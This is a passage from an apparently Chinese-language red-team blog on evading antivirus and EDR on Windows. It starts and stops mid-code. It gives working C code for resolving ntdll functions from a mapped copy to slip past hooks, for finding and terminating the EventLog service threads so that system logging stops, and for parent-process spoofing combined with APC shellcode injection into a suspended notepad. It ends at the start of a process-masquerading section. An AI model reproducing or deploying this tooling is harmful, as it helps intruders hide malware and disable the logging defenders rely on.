*)(name)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEREF_32( name )*(DWORD *)(name)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEREF_16( name )*(WORD *)(name)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEREF_8( name )*(BYTE *)(name)</span><br><br><span class="hljs-keyword">typedef</span> NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(<br>HANDLE ProcessHandle,<br>PVOID* BaseAddress,<br>ULONG_PTR ZeroBits,<br>PSIZE_T RegionSize,<br>ULONG AllocationType,<br>ULONG Protect);<br><br>FARPROC WINAPI GetProcAddressR(HANDLE hModule, LPCSTR lpProcName)<br>&#123;<br><span class="hljs-built_in">UINT_PTR</span> uiLibraryAddress = <span class="hljs-number">0</span>;<br>FARPROC fpResult = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (hModule == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>uiLibraryAddress = (<span class="hljs-built_in">UINT_PTR</span>)hModule;<br><br>__try<br>&#123;<br><span class="hljs-built_in">UINT_PTR</span> uiAddressArray = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">UINT_PTR</span> uiNameArray = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">UINT_PTR</span> uiNameOrdinals = <span class="hljs-number">0</span>;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="hljs-literal">NULL</span>;<br>PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="hljs-literal">NULL</span>;<br>pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew);<br>pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<br>pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory-&gt;VirtualAddress);<br>uiAddressArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfFunctions);<br>uiNameArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNames);<br>uiNameOrdinals = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNameOrdinals);<br><span class="hljs-keyword">if</span> (((DWORD)lpProcName &amp; <span class="hljs-number">0xFFFF0000</span>) == <span class="hljs-number">0x00000000</span>)<br>&#123;<br>uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory-&gt;Base) * <span class="hljs-keyword">sizeof</span>(DWORD));<br>fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>DWORD dwCounter = pExportDirectory-&gt;NumberOfNames;<br><span class="hljs-keyword">while</span> (dwCounter--)<br>&#123;<br><span class="hljs-type">char</span>* cpExportedFunctionName = (<span class="hljs-type">char</span>*)(uiLibraryAddress + DEREF_32(uiNameArray));<br><span class="hljs-keyword">if</span> (strcmp(cpExportedFunctionName, lpProcName) == <span class="hljs-number">0</span>)<br>&#123;<br>uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="hljs-keyword">sizeof</span>(DWORD));<br>fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));<br><br><span class="hljs-keyword">break</span>;<br>&#125;<br>uiNameArray += <span class="hljs-keyword">sizeof</span>(DWORD);<br>uiNameOrdinals += <span class="hljs-keyword">sizeof</span>(WORD);<br>&#125;<br>&#125;<br>&#125;<br>__except (EXCEPTION_EXECUTE_HANDLER)<br>&#123;<br>fpResult = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> fpResult;<br>&#125;<br><br><br><span class="hljs-type">int</span> main() &#123;<br><br>HANDLE hNtdllfile = CreateFileA(<span class="hljs-string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, <span class="hljs-literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddressR((HMODULE)lpNtdllmaping, <span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>);<br><br><span class="hljs-type">int</span> err = GetLastError();<br><br>LPVOID Address = <span class="hljs-literal">NULL</span>;<br>SIZE_T uSize = <span class="hljs-number">0x1000</span>;<br><br>NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &amp;Address, <span class="hljs-number">0</span>, &amp;uSize, MEM_COMMIT, PAGE_READWRITE);<br><br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="ring3层重写api-绕过hook"><a href="#ring3层重写api-绕过hook" class="headerlink" title="ring3层重写api 绕过hook"></a>ring3层重写api 绕过hook</h1><h2 id="简单介绍-4"><a href="#简单介绍-4" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>这个手法和重载ntdll一样的都是为了绕过杀软的hook，具体介绍可以看这个大佬的文章</p><p>重写ring3 API函数<br>作者：一天<br><a href="https://xz.aliyun.com/news/17323">https://xz.aliyun.com/news/17323</a><br>文章转载自 先知社区</p><h1 id="动态获取API（隐藏IAT导入表）"><a href="#动态获取API（隐藏IAT导入表）" class="headerlink" title="动态获取API（隐藏IAT导入表）"></a>动态获取API（隐藏IAT导入表）</h1><h2 id="简单介绍-5"><a href="#简单介绍-5" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><a href="https://xz.aliyun.com/news/17170">动态获取API函数（又称隐藏IAT）实现免杀<br>作者：一天<br>https://xz.aliyun.com/news/17170<br>文章转载自 先知社区</a></p><p>还是这个我最喜欢的博主，先知社区的大佬。</p><h1 id="Windows-日志绕过"><a href="#Windows-日志绕过" class="headerlink" title="Windows 日志绕过"></a>Windows 日志绕过</h1><h2 id="简单介绍-6"><a href="#简单介绍-6" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>通常在红队行动中，面临的最大挑战并不是诸如杀毒、EDR之类的防护软件，红队行动中工具&amp;代码的杀毒绕过只是事前工作(基本功)，所以攻击者使用的工具&amp;代码往往在本地就比较完备的完成了免杀工作，在这样的背景下，如何让工具尽可能少的留下痕迹就成为了红队成员首要解决的问题。</p><p>windows系统本身会记录一些较为特殊的操作，如登录、注销，而实现这部分功能通常是由windows自生的服务实现，windows 系统服务主要由svchost.exe进程进行启动和管理，所以识别并结束EventLog的服务线程，从而可以达到绕过windows的日志记录</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>定位到EventLog服务对应的进程</p><p>1.可以通过遍历系统所有进程的commandline是否带有eventlog服务名来进行识别</p><p>2.通过调用wmi接口来识别</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051757714.png" alt="image-20251005175701649"></p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051758905.png" alt="image-20251005175831818"></p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051758419.png" alt="image-20251005175801339"></p><p>可以看到这个进程就是拿来进行日志记录的，我们遍历进程，通过命令行参数，就可以定位到日志记录的进程，然后结束掉他就可以了</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strsafe.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ntdll.lib&quot;</span>) </span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> NTSTATUS;<br><br><span class="hljs-comment">/**/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> _THREAD_BASIC_INFORMATION<br>&#123;<br>NTSTATUS    exitStatus;<br>PVOID       pTebBaseAddress;<br><span class="hljs-built_in">CLIENT_ID</span>   clientId;<br>KAFFINITY               AffinityMask;<br><span class="hljs-type">int</span>Priority;<br><span class="hljs-type">int</span>BasePriority;<br><span class="hljs-type">int</span>v;<br><br>&#125; THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _SC_SERVICE_TAG_QUERY_TYPE<br>&#123;<br>ServiceNameFromTagInformation = <span class="hljs-number">1</span>,<br>ServiceNameReferencingModuleInformation,<br>ServiceNameTagMappingInformation,<br>&#125; SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> _SC_SERVICE_TAG_QUERY<br>&#123;<br>ULONG   processId;<br>ULONG   serviceTag;<br>ULONG   reserved;<br>PVOID   pBuffer;<br>&#125; SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;<br><br><span class="hljs-comment">//检查线程的Service Tag，需要调用I_QueryTagInformation函数</span><br><span class="hljs-comment">//函数会将tag信息保存到SC_SERVICE_TAG_QUERY结构体中</span><br><span class="hljs-keyword">typedef</span> ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);<br><span class="hljs-keyword">typedef</span> NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);<br><br><br><span class="hljs-type">BOOL</span> CheckEventProcess(DWORD ProcessId) &#123;<br><span class="hljs-type">BOOL</span> result = <span class="hljs-number">0</span>;<br>PROCESS_BASIC_INFORMATION pbi = &#123; <span class="hljs-number">0</span> &#125;;<br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, ProcessId);<br><span class="hljs-keyword">if</span> (!hProcess)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>DWORD status = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)<span class="hljs-number">0</span>, &amp;pbi, <span class="hljs-keyword">sizeof</span>(PVOID) * <span class="hljs-number">6</span>, <span class="hljs-literal">NULL</span>);<br><br>PPEB ppeb = (PPEB)((PVOID*)&amp;pbi)[<span class="hljs-number">1</span>];<br>PEB pebdata = &#123; <span class="hljs-number">0</span> &#125;;<br><br>ReadProcessMemory(hProcess, ppeb, &amp;pebdata, <span class="hljs-keyword">sizeof</span>(PEB), <span class="hljs-literal">NULL</span>);<br><br>PRTL_USER_PROCESS_PARAMETERS prtlp = (&amp;pebdata)-&gt;ProcessParameters;<br>RTL_USER_PROCESS_PARAMETERS rtlp = &#123; <span class="hljs-number">0</span> &#125;;<br><br>ReadProcessMemory(hProcess, prtlp, &amp;rtlp, <span class="hljs-keyword">sizeof</span>(RTL_USER_PROCESS_PARAMETERS), <span class="hljs-literal">NULL</span>);<br><br>PWSTR lpBuffer = (PWSTR)(&amp;rtlp)-&gt;CommandLine.Buffer;<br>USHORT len = (USHORT)(&amp;rtlp)-&gt;CommandLine.Length;<br><br>LPWSTR lpStrings = (LPWSTR)malloc(len);<br><br>ZeroMemory(lpStrings, len);<br><br>ReadProcessMemory(hProcess, lpBuffer, lpStrings, len, <span class="hljs-literal">NULL</span>);<br><br><br><span class="hljs-keyword">if</span> (wcsstr(lpStrings, L<span class="hljs-string">&quot;EventLog&quot;</span>))<br>&#123;<br>result = <span class="hljs-literal">true</span>;<br>&#125;<br><br>free(lpStrings);<br><br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br>DWORD GetEventLogProcessId() &#123;<br>HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hSnapshot)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>DWORD logpid = <span class="hljs-number">0</span>;<br>PROCESSENTRY32W pe32 = &#123; <span class="hljs-number">0</span> &#125;;<br>pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32W);<br><span class="hljs-type">BOOL</span> bRet = Process32FirstW(hSnapshot, &amp;pe32);<br><span class="hljs-keyword">while</span> (bRet)<br>&#123;<br><span class="hljs-keyword">if</span> (CheckEventProcess(pe32.th32ProcessID))<br>&#123;<br>logpid = pe32.th32ProcessID;<br>CloseHandle(hSnapshot);<br><span class="hljs-keyword">return</span> logpid;<br>&#125;<br>bRet = Process32NextW(hSnapshot, &amp;pe32);<br>&#125;<br>CloseHandle(hSnapshot);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">BOOL</span> CheckAndFuckEventProcess(DWORD processId, DWORD threadId, PULONG pServiceTag)<br>&#123;<br><br><br>;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>HANDLE hTag = <span class="hljs-literal">NULL</span>;<br>HMODULE advapi32 = <span class="hljs-literal">NULL</span>;<br>THREAD_BASIC_INFORMATION tbi = &#123; <span class="hljs-number">0</span> &#125;;<br>pI_QueryTagInformation I_QueryTagInformation = <span class="hljs-literal">NULL</span>;<br>pNtQueryInformationThread NtQueryInformationThread = <span class="hljs-literal">NULL</span>;<br>SC_SERVICE_TAG_QUERY tagQuery = &#123; <span class="hljs-number">0</span> &#125;;<br>WCHAR Buffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><br>NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandleW(L<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQueryInformationThread&quot;</span>);<br>hThread = OpenThread(THREAD_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, threadId);<br>NtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS)<span class="hljs-number">0</span>, &amp;tbi, <span class="hljs-number">0x30</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//内存对齐</span><br>hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, processId);<br>ReadProcessMemory(hProcess, ((PBYTE)tbi.pTebBaseAddress + <span class="hljs-number">0x1720</span>), &amp;hTag, <span class="hljs-keyword">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>);<br><br><br>advapi32 = LoadLibraryW(L<span class="hljs-string">&quot;advapi32.dll&quot;</span>);<br><br>I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(advapi32, <span class="hljs-string">&quot;I_QueryTagInformation&quot;</span>);<br>tagQuery.processId = processId;<br>tagQuery.serviceTag = (ULONG)hTag;<br>I_QueryTagInformation(<span class="hljs-literal">NULL</span>, ServiceNameFromTagInformation, &amp;tagQuery);<br><span class="hljs-keyword">if</span> (tagQuery.pBuffer != <span class="hljs-number">0</span>)<br>&#123;<br>StringCbCopyW(Buffer, MAX_PATH, (PCWSTR)tagQuery.pBuffer);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><br>CloseHandle(hProcess);<br>CloseHandle(hThread);<br>FreeLibrary(advapi32);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//判断buffer中包含service tag的字符串eventlog</span><br><span class="hljs-keyword">if</span> (!wcscmp(Buffer, L<span class="hljs-string">&quot;EventLog&quot;</span>))<br>&#123;<br>TerminateThread(hThread, <span class="hljs-number">0</span>);<br>wprintf((WCHAR*)L<span class="hljs-string">&quot;%d %s\n&quot;</span>, threadId, Buffer);<br>&#125;<br>LocalFree(tagQuery.pBuffer);<br>CloseHandle(hProcess);<br>CloseHandle(hThread);<br>FreeLibrary(advapi32);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> main() &#123;<br>DWORD dwPid;<br><br>dwPid = GetEventLogProcessId();<span class="hljs-comment">//定位到EventLog服务对应的进程</span><br><br><br>HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hSnapshot)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>THREADENTRY32 te32 = &#123; <span class="hljs-number">0</span> &#125;;<br>te32.dwSize = <span class="hljs-keyword">sizeof</span>(THREADENTRY32);<br><br><span class="hljs-type">BOOL</span> bRet = Thread32First(hSnapshot, &amp;te32);<br><span class="hljs-keyword">while</span> (bRet)<br>&#123;<br><span class="hljs-keyword">if</span> (te32.th32OwnerProcessID == dwPid)<br>&#123;<br><span class="hljs-comment">//找到对应的线程Kill掉</span><br>CheckAndFuckEventProcess(dwPid, te32.th32ThreadID, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><br>bRet = Thread32Next(hSnapshot, &amp;te32);<br>&#125;<br>CloseHandle(hSnapshot);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>当然这也只是ring3层的日志欺骗，还有更核心的一个机制ETW会记录操作的痕迹，后面再讲绕过。</p><h1 id="父进程欺骗"><a href="#父进程欺骗" class="headerlink" title="父进程欺骗"></a>父进程欺骗</h1><h2 id="简单介绍-7"><a href="#简单介绍-7" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>我们可以自己指定父进程，以增加判断成本从而使蓝队脑阔疼。</p><p>使用CreateProcess函数创建新进程时可以通过UpdateProcThreadAttribute( )函数人为修改STARTUPINFOEXA结构体的lpAttributeList成员变量值来指定子进程的父进程</p><p>当然也是ring3层的，面对监控内核层的工具，还是一样被发现。</p><h2 id="代码实现-4"><a href="#代码实现-4" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><br><span class="hljs-function">DWORD <span class="hljs-title">FindExplorerPID</span><span class="hljs-params">()</span> </span>&#123;<br>HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>PROCESSENTRY32 process = &#123; <span class="hljs-number">0</span> &#125;;<br>process.dwSize = <span class="hljs-built_in">sizeof</span>(process);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32First</span>(snapshot, &amp;process)) &#123;<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wcscmp</span>(process.szExeFile, <span class="hljs-string">L&quot;explorer.exe&quot;</span>))<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(snapshot, &amp;process));<br>&#125;<br><br><span class="hljs-built_in">CloseHandle</span>(snapshot);<br><span class="hljs-keyword">return</span> process.th32ProcessID;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br>STARTUPINFOEXA siex;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;siex, <span class="hljs-built_in">sizeof</span>(STARTUPINFOEXA));<br>PROCESS_INFORMATION piex;<br>SIZE_T sizeT;<br>siex.StartupInfo.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFOEXA);<br><br>HANDLE expHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, <span class="hljs-built_in">FindExplorerPID</span>());<br><br><span class="hljs-built_in">InitializeProcThreadAttributeList</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;sizeT);<br>siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-built_in">HeapAlloc</span>(<span class="hljs-built_in">GetProcessHeap</span>(), <span class="hljs-number">0</span>, sizeT);<br><span class="hljs-built_in">InitializeProcThreadAttributeList</span>(siex.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;sizeT);<br><span class="hljs-built_in">UpdateProcThreadAttribute</span>(siex.lpAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, <span class="hljs-built_in">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br><br><span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPSTARTUPINFOA)&amp;siex, &amp;piex);<br><br>LPVOID lpBaseAddress = (LPVOID)<span class="hljs-built_in">VirtualAllocEx</span>(piex.hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">WriteProcessMemory</span>(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseAddress, piex.hThread, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">ResumeThread</span>(piex.hThread);<br><span class="hljs-built_in">CloseHandle</span>(piex.hThread);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051812567.png" alt="image-20251005181230355"></p><h1 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h1><h2 id="简单介绍-8"><a href="#简单介绍-8" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>在蓝队排查恶意进程过程中，经常会使用processexplorer等进程检查工具进行详细的检测，而通常的恶意进程往往特征会比较明显，这种技术通过伪造PEB进程环境块来伪装自己，让自己的特征不那么明显，从而增加一点存活率。</p><h2 id="代码实现-5"><a href="#代码实现-5" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 